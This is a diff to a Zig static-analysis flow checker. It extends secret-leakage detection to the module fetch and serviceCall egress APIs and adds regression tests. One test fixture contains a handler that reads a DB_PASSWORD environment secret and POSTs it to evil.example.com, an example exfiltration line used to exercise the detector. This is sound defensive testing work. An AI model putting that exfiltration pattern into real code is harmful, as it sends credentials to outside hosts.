@@ -1120,23 +1120,57 @@ pub const FlowChecker = struct {
             return;
         }
 
-        if (tag == .call and self.isFetchSyncCall(call_data.callee)) {
-            if (call_data.args_count > 0) {
-                const url_arg = self.ir_view.getListIndex(call_data.args_start, 0);
-                self.checkSinkLabels(self.inferLabels(url_arg), node, .egress_url);
+        if (tag == .call) {
+            // Egress sinks: the bare `fetchSync(url, opts)` global plus the
+            // documented module APIs `fetch` (zigttp:fetch) and `serviceCall`
+            // (zigttp:service). Recognizing only the bare global let a secret
+            // flow into a `fetch(...)` body or URL go unflagged, falsely
+            // discharging no_secret_leakage / injection_safe.
+            if (self.isFetchSyncCall(call_data.callee)) {
+                self.checkEgressCall(call_data, node, 0, 1);
+            } else if (self.egressModuleFunc(call_data.callee)) |kind| {
+                switch (kind) {
+                    // fetch(url, init): url at 0, options at 1.
+                    .fetch => self.checkEgressCall(call_data, node, 0, 1),
+                    // serviceCall(service, route, init): route at 1, init at 2.
+                    .service_call => self.checkEgressCall(call_data, node, 1, 2),
+                }
             }
-            if (call_data.args_count > 1) {
-                const opts_arg = self.ir_view.getListIndex(call_data.args_start, 1);
-                const body_labels = self.inferObjectBodyLabels(opts_arg);
-                self.checkSinkLabels(body_labels, node, .egress_body);
-                // Defended: a validated value safely reaches an egress body.
-                // `.validated` is present only because the value passed a named
-                // validator; `findGuardInExpr` recurses the options object to
-                // the `body:` value to name it.
-                if (body_labels.has(.validated)) {
-                    for ([_]counterexample.PropertyTag{ .injection_safe, .input_validated }) |defended_tag| {
-                        self.recordValidated(defended_tag, opts_arg, node, "an egress request body");
-                    }
+        }
+    }
+
+    const EgressKind = enum { fetch, service_call };
+
+    /// Identify a call whose callee is an imported egress module function
+    /// (`fetch` from zigttp:fetch or `serviceCall` from zigttp:service).
+    fn egressModuleFunc(self: *const FlowChecker, callee: NodeIndex) ?EgressKind {
+        const callee_tag = self.ir_view.getTag(callee) orelse return null;
+        if (callee_tag != .identifier) return null;
+        const binding = self.ir_view.getBinding(callee) orelse return null;
+        const meta = self.module_fn_meta.get(binding.slot) orelse return null;
+        if (std.mem.eql(u8, meta.func, "fetch")) return .fetch;
+        if (std.mem.eql(u8, meta.func, "serviceCall")) return .service_call;
+        return null;
+    }
+
+    /// Apply the egress-URL and egress-body sink checks for a call with the URL
+    /// (or route) at `url_idx` and the request-options object at `body_idx`.
+    fn checkEgressCall(self: *FlowChecker, call_data: Node.CallExpr, node: NodeIndex, url_idx: u8, body_idx: u8) void {
+        if (call_data.args_count > url_idx) {
+            const url_arg = self.ir_view.getListIndex(call_data.args_start, url_idx);
+            self.checkSinkLabels(self.inferLabels(url_arg), node, .egress_url);
+        }
+        if (call_data.args_count > body_idx) {
+            const opts_arg = self.ir_view.getListIndex(call_data.args_start, body_idx);
+            const body_labels = self.inferObjectBodyLabels(opts_arg);
+            self.checkSinkLabels(body_labels, node, .egress_body);
+            // Defended: a validated value safely reaches an egress body.
+            // `.validated` is present only because the value passed a named
+            // validator; `findGuardInExpr` recurses the options object to the
+            // `body:` value to name it.
+            if (body_labels.has(.validated)) {
+                for ([_]counterexample.PropertyTag{ .injection_safe, .input_validated }) |defended_tag| {
+                    self.recordValidated(defended_tag, opts_arg, node, "an egress request body");
                 }
             }
         }
@@ -2129,6 +2163,69 @@ test "FlowChecker records validated defended path reaching egress body" {
     try std.testing.expect(saw_input_validated);
     // The property itself must actually hold for the card to render.
     try std.testing.expect(checker.getProperties().injection_safe);
+}
+
+test "FlowChecker flags a secret reaching a module fetch body" {
+    // Regression: the egress sink check recognized only the bare `fetchSync`
+    // global, so a secret sent via the documented `zigttp:fetch` API was not
+    // flagged and no_secret_leakage was falsely proven.
+    const allocator = std.testing.allocator;
+    const source =
+        \\import { fetch } from "zigttp:fetch";
+        \\import { env } from "zigttp:env";
+        \\function handler(req) {
+        \\  const secret = env("DB_PASSWORD");
+        \\  fetch("https://evil.example.com", { method: "POST", body: secret });
+        \\  return Response.json({ ok: true });
+        \\}
+    ;
+
+    var parser = @import("parser/parse.zig").Parser.init(allocator, source);
+    var atoms = context.AtomTable.init(allocator);
+    defer atoms.deinit();
+    parser.setAtomTable(&atoms);
+    defer parser.deinit();
+    const root = try parser.parse();
+    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
+    const handler_verifier = @import("handler_verifier.zig");
+    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
+        return error.HandlerNotFound;
+
+    var checker = FlowChecker.init(allocator, ir_view, &atoms);
+    defer checker.deinit();
+    _ = try checker.check(handler_fn);
+
+    try std.testing.expect(!checker.getProperties().no_secret_leakage);
+}
+
+test "FlowChecker proves no_secret_leakage for a benign module fetch" {
+    // Negative control for the fix above: a module fetch carrying no secret
+    // must still discharge no_secret_leakage (no false positive).
+    const allocator = std.testing.allocator;
+    const source =
+        \\import { fetch } from "zigttp:fetch";
+        \\function handler(req) {
+        \\  fetch("https://api.example.com", { method: "POST", body: "hello" });
+        \\  return Response.json({ ok: true });
+        \\}
+    ;
+
+    var parser = @import("parser/parse.zig").Parser.init(allocator, source);
+    var atoms = context.AtomTable.init(allocator);
+    defer atoms.deinit();
+    parser.setAtomTable(&atoms);
+    defer parser.deinit();
+    const root = try parser.parse();
+    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
+    const handler_verifier = @import("handler_verifier.zig");
+    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
+        return error.HandlerNotFound;
+
+    var checker = FlowChecker.init(allocator, ir_view, &atoms);
+    defer checker.deinit();
+    _ = try checker.check(handler_fn);
+
+    try std.testing.expect(checker.getProperties().no_secret_leakage);
 }
 
 test "FlowChecker records validated defended path reaching an HTML response" {
